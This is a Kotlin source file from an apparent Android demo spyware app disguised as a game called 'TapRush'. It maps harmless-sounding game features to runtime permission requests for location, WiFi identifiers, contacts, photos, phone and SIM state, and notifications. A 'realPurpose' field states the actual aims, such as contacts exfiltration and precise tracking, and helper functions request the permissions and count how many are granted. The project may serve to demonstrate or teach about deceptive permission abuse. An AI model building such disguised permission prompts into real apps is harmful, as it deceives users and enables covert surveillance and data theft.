package com.ghosttouch.attacker.ui.launcher

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import androidx.core.content.ContextCompat

/**
 * Permission groups disguised as game features.
 *
 * Each group has a convincing game justification. The user sees:
 * "Allow TapRush to access your location? — Needed for finding nearby players"
 *
 * In reality, each permission unlocks a new intelligence gathering vector.
 *
 * ## Real-world precedent
 * This is not theoretical. Major games on the Play Store have historically
 * requested excessive permissions with vague justifications. Users routinely
 * approve them because:
 * 1. The game won't work otherwise (or claims it won't)
 * 2. "Everyone else approved it" (social proof)
 * 3. Users don't read permission descriptions
 * 4. The justification sounds reasonable at a glance
 */
data class GamePermissionGroup(
    val gameFeature: String,        // What the user sees
    val gameDescription: String,    // Why the game "needs" it
    val realPurpose: String,        // What it actually does (shown in Control tab)
    val permissions: List<String>,  // Actual Android permissions
    val icon: String                // Emoji for the game UI
)

object GamePermissions {

    val groups = listOf(
        GamePermissionGroup(
            gameFeature = "Leaderboards & Multiplayer",
            gameDescription = "Connect to game servers for scores and challenges",
            realPurpose = "INTERNET access for data exfiltration",
            permissions = listOf(
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_NETWORK_STATE
            ),
            icon = "trophy"
        ),
        GamePermissionGroup(
            gameFeature = "Nearby Players",
            gameDescription = "Find friends playing near you for local co-op",
            realPurpose = "GPS location + WiFi SSID/BSSID for precise tracking",
            permissions = buildList {
                add(Manifest.permission.ACCESS_FINE_LOCATION)
                add(Manifest.permission.ACCESS_COARSE_LOCATION)
                add(Manifest.permission.ACCESS_WIFI_STATE)
            },
            icon = "location"
        ),
        GamePermissionGroup(
            gameFeature = "Share Scores",
            gameDescription = "Challenge your contacts to beat your high score",
            realPurpose = "Full contacts list exfiltration",
            permissions = listOf(Manifest.permission.READ_CONTACTS),
            icon = "people"
        ),
        GamePermissionGroup(
            gameFeature = "Game Replays",
            gameDescription = "Save and view your best game replays",
            realPurpose = "Scan photos and files on device",
            permissions = buildList {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    add(Manifest.permission.READ_MEDIA_IMAGES)
                } else {
                    add(Manifest.permission.READ_EXTERNAL_STORAGE)
                }
            },
            icon = "camera"
        ),
        GamePermissionGroup(
            gameFeature = "Do Not Disturb",
            gameDescription = "Pause game when you receive calls",
            realPurpose = "Read phone state, carrier info, SIM data",
            permissions = listOf(Manifest.permission.READ_PHONE_STATE),
            icon = "phone"
        ),
        GamePermissionGroup(
            gameFeature = "Daily Rewards",
            gameDescription = "Get notified about daily bonus rewards",
            realPurpose = "Post notifications + auto-start on boot",
            permissions = buildList {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    add(Manifest.permission.POST_NOTIFICATIONS)
                }
            },
            icon = "gift"
        ),
    )

    /**
     * Returns all runtime permissions that need to be requested.
     * Filters out already-granted and non-runtime permissions.
     */
    fun getPendingPermissions(context: Context): List<String> {
        return groups.flatMap { it.permissions }
            .filter { perm ->
                ContextCompat.checkSelfPermission(context, perm) != PackageManager.PERMISSION_GRANTED
            }
            .distinct()
    }

    /**
     * Returns all runtime permissions across all groups.
     */
    fun getAllRuntimePermissions(): Array<String> {
        return groups.flatMap { it.permissions }.distinct().toTypedArray()
    }

    /**
     * Checks how many permission groups are fully granted.
     */
    fun getGrantedCount(context: Context): Int {
        return groups.count { group ->
            group.permissions.all { perm ->
                ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
            }
        }
    }
}
